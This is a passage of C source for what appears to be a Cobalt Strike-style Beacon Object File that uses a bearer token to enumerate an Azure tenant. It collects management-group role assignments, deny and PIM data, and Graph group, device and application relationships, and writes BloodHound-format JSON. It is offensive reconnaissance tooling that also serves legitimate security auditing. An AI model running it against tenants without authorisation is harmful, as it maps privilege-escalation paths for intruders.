            roleDefinitionsEmitted, groups.count);
    }

    BarkBufAppendCollectionTail(&output, emitted, "management-group",
        &roleRequested, &roleSuccessful, &roleFailed,
        roleRequestedCount, roleSuccessfulCount, roleFailedCount,
        groupEnumerationComplete);
    if (output.ok && output.buf) {
        SYSTEMTIME st;
        char filename[300];
        KERNEL32$GetLocalTime(&st);
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZManagementGroupRoleAssignment_%04u%02u%02u_%02u%02u%02u.json",
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BarkWriteOutput(filename, output.buf, (DWORD)output.len);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] BARK AZManagementGroupRoleAssignment found %d objects across %d management group(s)\n",
            emitted, groups.count);
    }
    BarkEmitAllInfoArmMarker("AZManagementGroupRoleAssignment");
    BarkBufFree(&output);
    BarkBufFree(&descendantOutput);
    BarkBufFree(&managementGroupOutput);
    BarkBufFree(&roleDefinitionOutput);
    BarkBufFree(&roleRequested);
    BarkBufFree(&roleSuccessful);
    BarkBufFree(&roleFailed);
    BarkBufFree(&descendantRequested);
    BarkBufFree(&descendantSuccessful);
    BarkBufFree(&descendantFailed);
    BarkBufFree(&definitionRequested);
    BarkBufFree(&definitionSuccessful);
    BarkBufFree(&definitionFailed);
    BarkIdListFree(&groups);
}

/* Management-group equivalents for deny/PIM data.  Keep one output envelope
 * per kind so the client-side analyzer can load nested management-group
 * results without relying on second-resolution filenames. */
static void BarkGetBHManagementGroupExtraByKind(
    const char *bearerToken, const char *tenantId, const char *singleGroupId,
    const char *endpoint, const char *apiVersion, const char *kind,
    const BarkIdList *sharedGroups, int sharedGroupsComplete) {
    BarkIdList groups;
    BarkBuf output = { NULL, 0, 0, 1 };
    BarkBuf requestedScopes = { NULL, 0, 0, 1 };
    BarkBuf successfulScopes = { NULL, 0, 0, 1 };
    BarkBuf failedScopes = { NULL, 0, 0, 1 };
    int emitted = 0;
    int requestedCount = 0;
    int successfulCount = 0;
    int failedCount = 0;
    int groupEnumerationComplete = sharedGroupsComplete;
    int gi;

    int ownsGroups = 0;
    if (sharedGroups) {
        groups = *sharedGroups;
    } else {
        BarkIdListInit(&groups);
        ownsGroups = 1;
    }
    if (!sharedGroups && singleGroupId && singleGroupId[0]) {
        SIZE_T length = MSVCRT$strlen(singleGroupId) + 1;
        char *copy = (char *)HAlloc(length);
        if (copy) {
            MSVCRT$memcpy(copy, singleGroupId, length);
            BarkIdListAppend(&groups, copy);
            groupEnumerationComplete = 1;
        }
    } else if (!sharedGroups) {
        groups = BarkEnumEntityIdsWithStatus(
            L"management.azure.com",
            "/providers/Microsoft.Management/managementGroups?api-version=2020-05-01",
            bearerToken, "\"name\"", &groupEnumerationComplete);
    }
    BarkBufAppend(&output, "{\"data\":[", 9);
    BarkBufAppend(&requestedScopes, "[", 1);
    BarkBufAppend(&successfulScopes, "[", 1);
    BarkBufAppend(&failedScopes, "[", 1);
    if (!groupEnumerationComplete) {
        const char *rootScope =
            "/providers/Microsoft.Management/managementGroups";
        BarkBufAppendScopeValue(&requestedScopes, &requestedCount, rootScope);
        BarkBufAppendScopeValue(&failedScopes, &failedCount, rootScope);
    }
    for (gi = 0; gi < groups.count; gi++) {
        char pathBuf[2048];
        char managementGroupScope[1024];
        int scopeComplete = 1;
        BarkBuildManagementGroupScope(groups.ids[gi], managementGroupScope,
            sizeof(managementGroupScope));
        BarkBufAppendScopeValue(&requestedScopes, &requestedCount,
            managementGroupScope);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/providers/Microsoft.Management/managementGroups/%s/providers/"
            "Microsoft.Authorization/%s?api-version=%s",
            groups.ids[gi], endpoint, apiVersion);
        LPWSTR widePath = MbsToWcs(pathBuf);
        if (!widePath) {
            BarkBufAppendScopeValue(&failedScopes, &failedCount,
                managementGroupScope);
            continue;
        }
        int isArray = 0;
        LPCWSTR pathArg = widePath;
        LPWSTR nextWide = NULL;
        char *nextUrl = NULL;
        while (1) {
            int pageSucceeded = 0;
            char *next = BarkGetBHPageBufArm(
                L"management.azure.com", pathArg, bearerToken, kind,
                &output, &emitted, &isArray, tenantId, "resourceGroupId",
                &pageSucceeded);
            if (nextUrl) { HFree(nextUrl); nextUrl = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }
            if (!pageSucceeded) {
                scopeComplete = 0;
                if (next) HFree(next);
                break;
            }
            if (!next) break;
            nextWide = BarkResolveNextLink(next,
                L"management.azure.com", "");
            nextUrl = next;
            if (!nextWide) {
                scopeComplete = 0;
                break;
            }
            pathArg = nextWide;
        }
        if (nextUrl) HFree(nextUrl);
        if (nextWide) HFree(nextWide);
        HFree(widePath);
        if (scopeComplete)
            BarkBufAppendScopeValue(&successfulScopes, &successfulCount,
                managementGroupScope);
        else
            BarkBufAppendScopeValue(&failedScopes, &failedCount,
                managementGroupScope);
    }
    BarkBufAppendCollectionTail(&output, emitted, "management-group",
        &requestedScopes, &successfulScopes, &failedScopes,
        requestedCount, successfulCount, failedCount,
        groupEnumerationComplete);
    if (output.ok && output.buf) {
        SYSTEMTIME st;
        char filename[300];
        const char *kindShort = kind;
        KERNEL32$GetLocalTime(&st);
        if (kindShort[0] == 'A' && kindShort[1] == 'Z') kindShort += 2;
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZ%sManagementGroup_%04u%02u%02u_%02u%02u%02u.json",
            kindShort, (unsigned)st.wYear, (unsigned)st.wMonth,
            (unsigned)st.wDay, (unsigned)st.wHour, (unsigned)st.wMinute,
            (unsigned)st.wSecond);
        BarkWriteOutput(filename, output.buf, (DWORD)output.len);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] BARK %s found %d objects across %d management group(s)\n",
            kind, emitted, groups.count);
    }
    BarkEmitAllInfoArmMarker(kind);
    BarkBufFree(&output);
    BarkBufFree(&requestedScopes);
    BarkBufFree(&successfulScopes);
    BarkBufFree(&failedScopes);
    if (ownsGroups) BarkIdListFree(&groups);
}

static void BarkGetBHAllManagementGroupAuthorizationExtras(
    const char *bearerToken, const char *tenantId, const char *singleGroupId) {
    BarkIdList groups;
    int groupEnumerationComplete = 0;
    BarkIdListInit(&groups);
    if (singleGroupId && singleGroupId[0]) {
        SIZE_T length = MSVCRT$strlen(singleGroupId) + 1;
        char *copy = (char *)HAlloc(length);
        if (copy) {
            MSVCRT$memcpy(copy, singleGroupId, length);
            BarkIdListAppend(&groups, copy);
            groupEnumerationComplete = 1;
        }
    } else {
        groups = BarkEnumEntityIdsWithStatus(
            L"management.azure.com",
            "/providers/Microsoft.Management/managementGroups?api-version=2020-05-01",
            bearerToken, "\"name\"", &groupEnumerationComplete);
    }
    BarkGetBHManagementGroupExtraByKind(bearerToken, tenantId, singleGroupId,
        "denyAssignments", "2022-04-01", "AZDenyAssignment", &groups,
        groupEnumerationComplete);
    BarkGetBHManagementGroupExtraByKind(bearerToken, tenantId, singleGroupId,
        "roleEligibilityScheduleInstances", "2020-10-01",
        "AZRoleEligibilityScheduleInstance", &groups,
        groupEnumerationComplete);
    BarkGetBHManagementGroupExtraByKind(bearerToken, tenantId, singleGroupId,
        "roleAssignmentScheduleInstances", "2020-10-01",
        "AZRoleAssignmentScheduleInstance", &groups,
        groupEnumerationComplete);
    BarkGetBHManagementGroupExtraByKind(bearerToken, tenantId, singleGroupId,
        "roleManagementPolicyAssignments", "2020-10-01",
        "AZRoleManagementPolicyAssignment", &groups,
        groupEnumerationComplete);
    BarkGetBHManagementGroupExtraByKind(bearerToken, tenantId, singleGroupId,
        "roleManagementPolicies", "2020-10-01", "AZRoleManagementPolicy",
        &groups, groupEnumerationComplete);
    BarkIdListFree(&groups);
}

/* ================================================================
 * BarkGetBHLegacyAutoEnum
 *
 * Auto-enumerate parent entities from the legacy AAD Graph
 * (graph.windows.net), then for each entity call a child API
 * and merge all results into a single BH JSON envelope.
 *
 * parentCollection : e.g. "groups", "devices", "applications", "servicePrincipals"
 * childSuffix      : e.g. "members", "owners", "registeredOwners", "appRoleAssignments"
 * kind             : BH kind, e.g. "AZGroupMember"
 *
 * The parent entities are listed via:
 *   GET /{tenantId}/{parentCollection}?api-version=1.6&$top=999
 * and "objectId" is extracted from each.
 *
 * Then for each objectId, the child is fetched:
 *   GET /{tenantId}/{parentCollection}/{objectId}/{childSuffix}?api-version=1.6&$top=999
 * ================================================================ */
static void BarkGetBHLegacyAutoEnum(const char *bearerToken,
                                     const char *tenantId,
                                     const char *parentCollection,
                                     const char *childSuffix,
                                     const char *kind,
                                     int aliasObjectId,
                                     const char *dataSuffix) {
    /* --- Phase 1: list all parent entities (paginated) --- */
    char parentPath[512];
    MSVCRT$sprintf_s(parentPath, sizeof(parentPath),
        "/%s/%s?api-version=1.6&$top=999", tenantId, parentCollection);

    BarkIdList ids = BarkEnumEntityIds(
        L"graph.windows.net", parentPath, bearerToken, "\"objectId\"");

    if (ids.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] No %s found for %s enumeration\n", parentCollection, childSuffix);
        BarkIdListFree(&ids);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Found %d %s, enumerating %s for each...\n",
        ids.count, parentCollection, childSuffix);

    /* --- Phase 2: for each entity, fetch child collection --- */
    char tenantBase[256];
    MSVCRT$sprintf_s(tenantBase, sizeof(tenantBase), "/%s/", tenantId);

    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);
    int emitted = 0;
    int ei;

    for (ei = 0; ei < ids.count; ei++) {
        char childPath[2048];
        MSVCRT$sprintf_s(childPath, sizeof(childPath),
            "/%s/%s/%s/%s?api-version=1.6&$top=999",
            tenantId, parentCollection, ids.ids[ei], childSuffix);
        LPWSTR widePath = MbsToWcs(childPath);
        if (!widePath) continue;

        int isArray = 0;
        LPCWSTR pathArg = widePath;
        LPWSTR nextWide = NULL;
        char  *nextUrl  = NULL;

        while (1) {
            char *next = BarkGetBHPageBuf(L"graph.windows.net", pathArg,
                                          bearerToken, kind, &b, &emitted, &isArray, dataSuffix, aliasObjectId);
            if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }
            if (!next) break;
            nextWide = BarkResolveNextLink(next, L"graph.windows.net", tenantBase);
            nextUrl = next;
            if (!nextWide) break;
            pathArg = nextWide;
        }
        HFree(widePath);
    }

    /* --- Phase 3: write BH envelope --- */
    char tail[128];
    int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}", emitted);
    if (tailLen > 0) BarkBufAppend(&b, tail, (SIZE_T)tailLen);

    if (b.ok && b.buf) {
        SYSTEMTIME st;
        KERNEL32$GetLocalTime(&st);
        char filename[300];
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZ%s_%04u%02u%02u_%02u%02u%02u.json",
            kind + 2,   /* skip "AZ" prefix for filename */
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BeaconPrintf(CALLBACK_OUTPUT,
                "[+] BARK %s found %d objects across %d %s\n",
                kind, emitted, ids.count, parentCollection);
        BarkWriteOutput(filename, b.buf, (DWORD)b.len);
    }
    BarkBufFree(&b);
    BarkIdListFree(&ids);
}

/* ================================================================
 * BarkGetBHGraphAutoEnum
 *
 * Auto-enumerate parent entities from MS Graph v1.0, then for each
 * entity fetch a child collection and merge all results into a single
 * BH JSON envelope.
 *
 * parentCollection : e.g. "groups", "devices", "applications", "servicePrincipals"
 * childSuffix      : e.g. "members", "owners", "registeredOwners"
 * kind             : BH kind, e.g. "AZGroupMember"
 *
 * The parent entities are listed via:
 *   GET /v1.0/{parentCollection}?$top=999&$select=id
 * and "id" is extracted from each (Graph v1.0 uses "id", not "objectId").
 *
 * Then for each id, the child is fetched. Graph directory relationship
 * endpoints commonly allow up to 999 objects per page; the service may still
 * clamp that value for a particular relationship and return its own nextLink.
 *   GET /v1.0/{parentCollection}/{id}/{childSuffix}?$top=999
 * ================================================================ */
static void BarkGetBHGraphAutoEnum(const char *bearerToken,
                                    const char *parentCollection,
                                    const char *childSuffix,
                                    const char *kind) {
    /* --- Phase 1: list all parent entity IDs (paginated) --- */
    char parentPath[512];
    MSVCRT$sprintf_s(parentPath, sizeof(parentPath),
        "/v1.0/%s?$top=999&$select=id", parentCollection);

    BarkIdList ids = BarkEnumEntityIds(
        L"graph.microsoft.com", parentPath, bearerToken, "\"id\"");

    if (ids.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] No %s found for %s enumeration\n", parentCollection, childSuffix);
        BarkIdListFree(&ids);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Found %d %s, enumerating %s for each...\n",
        ids.count, parentCollection, childSuffix);

    /* --- Phase 2: for each entity, fetch child collection --- */
    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);
    int emitted = 0;
    int ei;

    for (ei = 0; ei < ids.count; ei++) {
        char childPath[2048];
        MSVCRT$sprintf_s(childPath, sizeof(childPath),
            "/v1.0/%s/%s/%s?$top=999",
            parentCollection, ids.ids[ei], childSuffix);
        LPWSTR widePath = MbsToWcs(childPath);
        if (!widePath) continue;

        int isArray = 0;
        LPCWSTR pathArg = widePath;
        LPWSTR nextWide = NULL;
        char  *nextUrl  = NULL;

        while (1) {
            char *next = BarkGetBHPageBuf(L"graph.microsoft.com", pathArg,
                                          bearerToken, kind, &b, &emitted, &isArray, NULL, 0);
            if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }
            if (!next) break;
            char *np = next;
            if (MSVCRT$strncmp(np, "http://", 7) == 0)       np += 7;
            else if (MSVCRT$strncmp(np, "https://", 8) == 0)  np += 8;
            char *slash = MSVCRT$strstr(np, "/");
            nextWide = MbsToWcs(slash ? slash : next);
            nextUrl = next;
            if (!nextWide) break;
            pathArg = nextWide;
        }
        HFree(widePath);
    }

    /* --- Phase 3: write BH envelope to file --- */
    char tail[128];
    int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}", emitted);
    if (tailLen > 0) BarkBufAppend(&b, tail, (SIZE_T)tailLen);

    if (b.ok && b.buf) {
        SYSTEMTIME st;
        KERNEL32$GetLocalTime(&st);
        char filename[300];
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZ%s_%04u%02u%02u_%02u%02u%02u.json",
            kind + 2,   /* skip "AZ" prefix */
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BeaconPrintf(CALLBACK_OUTPUT,
                "[+] BARK %s found %d objects across %d %s\n",
                kind, emitted, ids.count, parentCollection);
        BarkWriteOutput(filename, b.buf, (DWORD)b.len);
    }
    BarkBufFree(&b);
    BarkIdListFree(&ids);
}

/* ================================================================
 * Graph relationship collection helpers
 * ================================================================ */

#define BARK_GRAPH_PARENT_WORKERS 8
#define BARK_GRAPH_CHUNK_MAX_BYTES (4 * 1024 * 1024)
#define BARK_GRAPH_CHUNK_MAX_PARENTS 256

typedef struct {
    int childRequests;
    int childPages;
    int childObjects;
    int emittedParents;
    int failedParents;
} BarkBHCollectionStats;

typedef struct {
    BarkBuf output;
    int emitted;
    BarkBHCollectionStats stats;
    const char *bearerToken;
    const char *parentCollection;
    const char *parentId;
    const char *outputParentId;
    const char *childSuffix;
    const char *kind;
    const char *parentIdKey;
    const char *childCollectionKey;
    const char *childSingularKey;
    const char *dataSuffix;
    int extended;
} BarkGraphParentJob;

/*
 * The output is intentionally emitted as independent valid BH envelopes.
 * BloodHound accepts multiple files, and this keeps peak BOF memory bounded
 * without splitting a single parent's relationship object.
 */
typedef struct {
    BarkBuf buffer;
    int emitted;
    int part;
    int wroteAny;
    const char *kind;
    int includeCollectionSummary;
    int collectionComplete;
    int requestedParents;
    int successfulParents;
    int failedParents;
} BarkBHChunkWriter;

static void BarkBHChunkWriterInit(BarkBHChunkWriter *w, const char *kind) {
    w->buffer.buf = NULL;
    w->buffer.cap = 0;
    w->buffer.len = 0;
    w->buffer.ok = 1;
    w->emitted = 0;
    w->part = 0;
    w->wroteAny = 0;
    w->kind = kind;
    w->includeCollectionSummary = 0;
    w->collectionComplete = 0;
    w->requestedParents = 0;
    w->successfulParents = 0;
    w->failedParents = 0;
    BarkBufAppend(&w->buffer, "{\"data\":[", 9);
}

static void BarkBHChunkWriterFlush(BarkBHChunkWriter *w, int force) {
    SYSTEMTIME st;
    char filename[320];
    char tail[384];
    int tailLen;

    if (!w->buffer.ok || (!force && w->emitted == 0)) return;
    if (w->includeCollectionSummary) {
        tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
            "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d,"
            "\"collection\":{\"complete\":%s,\"requestedParents\":%d,"
            "\"successfulParents\":%d,\"failedParents\":%d}}}",
            w->emitted, w->collectionComplete ? "true" : "false",
            w->requestedParents, w->successfulParents, w->failedParents);
    } else {
        tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
            "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}",
            w->emitted);
    }
    if (tailLen > 0) BarkBufAppend(&w->buffer, tail, (SIZE_T)tailLen);

    if (w->buffer.ok && w->buffer.buf) {
        KERNEL32$GetLocalTime(&st);
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZ%s_%04u%02u%02u_%02u%02u%02u_%03d.json",
            w->kind + 2,
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond,
            w->part++);
        BarkWriteOutput(filename, w->buffer.buf, (DWORD)w->buffer.len);
        w->wroteAny = 1;
    }

    {
        int nextPart = w->part;
        int wroteAny = w->wroteAny;
        BarkBufFree(&w->buffer);
        BarkBHChunkWriterInit(w, w->kind);
        w->part = nextPart;
        w->wroteAny = wroteAny;
    }
}

static void BarkBHChunkWriterAppend(BarkBHChunkWriter *w,
                                    const BarkBuf *item) {
    if (!item || !item->buf || item->len == 0 || !item->ok) return;
    if (w->emitted > 0) BarkBufAppend(&w->buffer, ",", 1);
    BarkBufAppend(&w->buffer, item->buf, item->len);
    w->emitted++;
    if (w->buffer.len >= BARK_GRAPH_CHUNK_MAX_BYTES ||
        w->emitted >= BARK_GRAPH_CHUNK_MAX_PARENTS)
        BarkBHChunkWriterFlush(w, 0);
}

/* ================================================================
 * EmitGroupedChildren
 *
 * For a single parent entity, fetch all children from MS Graph and emit
 * one BH item grouping them.  Output format:
 *
 *   {"kind":"<kind>","data":{
 *       "<childCollectionKey>":[
 *           {"<parentIdKey>":"<id>","<childSingularKey>":{...child...}},
 *           ...
 *       ],
 *       "<parentIdKey>":"<id>"
 *   }}
 *
 * parentCollection  : e.g. "devices", "applications", "groups", "servicePrincipals"
 * parentId          : object ID of the parent entity
 * childSuffix       : e.g. "registeredOwners", "owners", "members"
 * kind              : BH kind, e.g. "AZDeviceOwner"
 * parentIdKey       : key name for the parent ID, e.g. "deviceId"
 * childCollectionKey: key for the array, e.g. "owners", "members"
 * childSingularKey  : key wrapping each child, e.g. "owner", "member"
 * ================================================================ */
static int EmitGroupedChildren(BarkBuf *b, const char *bearerToken,
                                const char *parentCollection,
                                const char *parentId,
                                const char *outputParentId,
                                const char *childSuffix,
                                const char *kind,
                                const char *parentIdKey,
                                const char *childCollectionKey,
                                const char *childSingularKey,
                                int *emitted,
                                BarkBHCollectionStats *stats,
                                int reportErrors)
{
    const char *emittedParentId =
        (outputParentId && outputParentId[0]) ? outputParentId : parentId;
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) {
        if (stats) stats->failedParents++;
        return 0;
    }

    char pathBuf[2048];
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/v1.0/%s/%s/%s?$top=999",
        parentCollection, parentId, childSuffix);
    LPWSTR widePath = MbsToWcs(pathBuf);
    if (!widePath) {
        if (stats) stats->failedParents++;
        HFree(hdrWide);
        return 0;
    }

    SIZE_T savedLen = b->len;

    char prefix[512];
    int n;
    if (*emitted == 0)
        n = MSVCRT$sprintf_s(prefix, sizeof(prefix),
            "{\"kind\":\"%s\",\"data\":{\"%s\":[", kind, childCollectionKey);
    else
        n = MSVCRT$sprintf_s(prefix, sizeof(prefix),
            ",{\"kind\":\"%s\",\"data\":{\"%s\":[", kind, childCollectionKey);
    if (n > 0) BarkBufAppend(b, prefix, (SIZE_T)n);

    int childCount = 0;
    int collectionComplete = 1;
    LPCWSTR pathArg = widePath;
    char  *nextUrl  = NULL;
    LPWSTR nextWide = NULL;

    while (1) {
        if (stats) stats->childRequests++;
        DWORD status = 0;
        int pageValid = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"graph.microsoft.com",
            pathArg, hdrWide, NULL, 0, &status);

        if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }

        if (!resp || status >= 400) {
            collectionComplete = 0;
            if (resp) {
                if (reportErrors)
                    BeaconPrintf(CALLBACK_ERROR,
                        "[-] %s: HTTP %lu for %s %s:\n    %s\n",
                        kind, status, parentIdKey, parentId, resp);
                HFree(resp);
            }
            break;
        }

        SIZE_T respLen = MSVCRT$strlen(resp);
        const char *end = resp + respLen;
        const char *vKey = JsonFindKey(resp, end, "\"value\"");
        if (vKey) {
            const char *colon = JsonFindKey(vKey, end, ":");
            if (colon) {
                colon++;
                while (colon < end && (*colon == ' ' || *colon == '\t' ||
                       *colon == '\n' || *colon == '\r')) colon++;
                if (colon < end && *colon == '[') {
                    const char *arrEnd = JsonSkipBalanced(colon, end);
                    if (arrEnd) {
                        const char *p = colon + 1;
                        pageValid = 1;
                        while (p < arrEnd - 1) {
                            while (p < arrEnd - 1 &&
                                   (*p == ' ' || *p == '\n' || *p == '\r' ||
                                    *p == '\t' || *p == ','))
                                p++;
                            if (p >= arrEnd - 1) break;
                            if (*p != '{') {
                                pageValid = 0;
                                break;
                            }
                            const char *itemEnd = JsonSkipBalanced(p, arrEnd);
                            if (!itemEnd) {
                                pageValid = 0;
                                break;
                            }

                            if (childCount > 0)
                                BarkBufAppend(b, ",", 1);

                            char entryPrefix[512];
                            int ep = MSVCRT$sprintf_s(entryPrefix, sizeof(entryPrefix),
                                "{\"%s\":\"", parentIdKey);
                            if (ep > 0) BarkBufAppend(b, entryPrefix, (SIZE_T)ep);
                            BarkBufAppendAsciiUpper(b, emittedParentId,
                                MSVCRT$strlen(emittedParentId));
                            ep = MSVCRT$sprintf_s(entryPrefix, sizeof(entryPrefix),
                                "\",\"%s\":", childSingularKey);
                            if (ep > 0) BarkBufAppend(b, entryPrefix, (SIZE_T)ep);
                            if (!BarkBufAppendUppercaseJsonStringField(
                                    b, p, itemEnd, "\"id\""))
                                BarkBufAppend(b, p, (SIZE_T)(itemEnd - p));
                            BarkBufAppend(b, "}", 1);
                            childCount++;
                            if (stats) stats->childObjects++;
                            p = itemEnd;
                        }
                    }
                }
            }
        }

        if (!pageValid) {
            collectionComplete = 0;
            HFree(resp);
            break;
        }

        if (stats) stats->childPages++;

        nextUrl = JsonExtractNextLink(resp, end);
        HFree(resp);
        if (!nextUrl) break;

        char *np = nextUrl;
        if (MSVCRT$strncmp(np, "http://", 7) == 0)       np += 7;
        else if (MSVCRT$strncmp(np, "https://", 8) == 0)  np += 8;
        char *slash = MSVCRT$strstr(np, "/");
        nextWide = MbsToWcs(slash ? slash : nextUrl);
        if (!nextWide) {
            collectionComplete = 0;
            break;
        }
        pathArg = nextWide;
    }

    if (childCount > 0) {
        char suffix[512];
        int sn = MSVCRT$sprintf_s(suffix, sizeof(suffix),
            "],\"%s\":\"", parentIdKey);
        if (sn > 0) BarkBufAppend(b, suffix, (SIZE_T)sn);
        BarkBufAppendAsciiUpper(b, emittedParentId,
            MSVCRT$strlen(emittedParentId));
        BarkBufAppend(b, "\"}}", 3);
        (*emitted)++;
    } else {
        b->len = savedLen;
        if (b->buf) b->buf[b->len] = '\0';
    }

    HFree(hdrWide);
    HFree(widePath);
    if (nextUrl)  HFree(nextUrl);
    if (nextWide) HFree(nextWide);
    if (!collectionComplete && stats) stats->failedParents++;
    if (childCount > 0 && stats) stats->emittedParents++;
    return childCount;
}

/* EmitGroupedChildrenEx — like EmitGroupedChildren but injects dataSuffix
 * (e.g. "\"tenantId\":\"...\",\"tenantName\":\"...\"") into the data object. */
static int EmitGroupedChildrenEx(BarkBuf *b, const char *bearerToken,
                                  const char *parentCollection,
                                  const char *parentId,
                                  const char *outputParentId,
                                  const char *childSuffix,
                                  const char *kind,
                                  const char *parentIdKey,
                                  const char *childCollectionKey,
                                  const char *childSingularKey,
                                  const char *dataSuffix,
                                  int *emitted,
                                  BarkBHCollectionStats *stats,
                                  int reportErrors)
{
    const char *emittedParentId =
        (outputParentId && outputParentId[0]) ? outputParentId : parentId;
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) {
        if (stats) stats->failedParents++;
        return 0;
    }

    char pathBuf[2048];
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/v1.0/%s/%s/%s?$top=999",
        parentCollection, parentId, childSuffix);
    LPWSTR widePath = MbsToWcs(pathBuf);
    if (!widePath) {
        if (stats) stats->failedParents++;
        HFree(hdrWide);
        return 0;
    }

    SIZE_T savedLen = b->len;

    char prefix[512];
    int n;
    if (*emitted == 0)
        n = MSVCRT$sprintf_s(prefix, sizeof(prefix),
            "{\"kind\":\"%s\",\"data\":{\"%s\":[", kind, childCollectionKey);
    else
        n = MSVCRT$sprintf_s(prefix, sizeof(prefix),
            ",{\"kind\":\"%s\",\"data\":{\"%s\":[", kind, childCollectionKey);
    if (n > 0) BarkBufAppend(b, prefix, (SIZE_T)n);

    int childCount = 0;
    int collectionComplete = 1;
    LPCWSTR pathArg = widePath;
    char  *nextUrl  = NULL;
    LPWSTR nextWide = NULL;

    while (1) {
        if (stats) stats->childRequests++;
        DWORD status = 0;
        int pageValid = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"graph.microsoft.com",
            pathArg, hdrWide, NULL, 0, &status);

        if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }

        if (!resp || status >= 400) {
            collectionComplete = 0;
            if (resp) {
                if (reportErrors)
                    BeaconPrintf(CALLBACK_ERROR,
                        "[-] %s: HTTP %lu for %s %s:\n    %s\n",
                        kind, status, parentIdKey, parentId, resp);
                HFree(resp);
            }
            break;
        }

        SIZE_T respLen = MSVCRT$strlen(resp);
        const char *end = resp + respLen;
        const char *vKey = JsonFindKey(resp, end, "\"value\"");
        if (vKey) {
            const char *colon = JsonFindKey(vKey, end, ":");
            if (colon) {
                colon++;
                while (colon < end && (*colon == ' ' || *colon == '\t' ||
                       *colon == '\n' || *colon == '\r')) colon++;
                if (colon < end && *colon == '[') {
                    const char *arrEnd = JsonSkipBalanced(colon, end);
                    if (arrEnd) {
                        const char *p = colon + 1;
                        pageValid = 1;
                        while (p < arrEnd - 1) {
                            while (p < arrEnd - 1 &&
                                   (*p == ' ' || *p == '\n' || *p == '\r' ||
                                    *p == '\t' || *p == ','))
                                p++;
                            if (p >= arrEnd - 1) break;
                            if (*p != '{') {
                                pageValid = 0;
                                break;
                            }
                            const char *itemEnd = JsonSkipBalanced(p, arrEnd);
                            if (!itemEnd) {
                                pageValid = 0;
                                break;
                            }

                            if (childCount > 0)
                                BarkBufAppend(b, ",", 1);

                            char entryPrefix[512];
                            int ep = MSVCRT$sprintf_s(entryPrefix, sizeof(entryPrefix),
                                "{\"%s\":\"", parentIdKey);
                            if (ep > 0) BarkBufAppend(b, entryPrefix, (SIZE_T)ep);
                            BarkBufAppendAsciiUpper(b, emittedParentId,
                                MSVCRT$strlen(emittedParentId));
                            ep = MSVCRT$sprintf_s(entryPrefix, sizeof(entryPrefix),
                                "\",\"%s\":", childSingularKey);
                            if (ep > 0) BarkBufAppend(b, entryPrefix, (SIZE_T)ep);
                            if (!BarkBufAppendUppercaseJsonStringField(
                                    b, p, itemEnd, "\"id\""))
                                BarkBufAppend(b, p, (SIZE_T)(itemEnd - p));
                            BarkBufAppend(b, "}", 1);
                            childCount++;
                            if (stats) stats->childObjects++;
                            p = itemEnd;
                        }
                    }
                }
            }
        }

        if (!pageValid) {
            collectionComplete = 0;
            HFree(resp);
            break;
        }

        if (stats) stats->childPages++;

        nextUrl = JsonExtractNextLink(resp, end);
        HFree(resp);
        if (!nextUrl) break;

        char *np = nextUrl;
        if (MSVCRT$strncmp(np, "http://", 7) == 0)       np += 7;
        else if (MSVCRT$strncmp(np, "https://", 8) == 0)  np += 8;
        char *slash = MSVCRT$strstr(np, "/");
        nextWide = MbsToWcs(slash ? slash : nextUrl);
        if (!nextWide) {
            collectionComplete = 0;
            break;
        }
        pathArg = nextWide;
    }

    if (childCount > 0) {
        char suffix[1024];
        int sn = MSVCRT$sprintf_s(suffix, sizeof(suffix),
            "],\"%s\":\"", parentIdKey);
        if (sn > 0) BarkBufAppend(b, suffix, (SIZE_T)sn);
        BarkBufAppendAsciiUpper(b, emittedParentId,
            MSVCRT$strlen(emittedParentId));
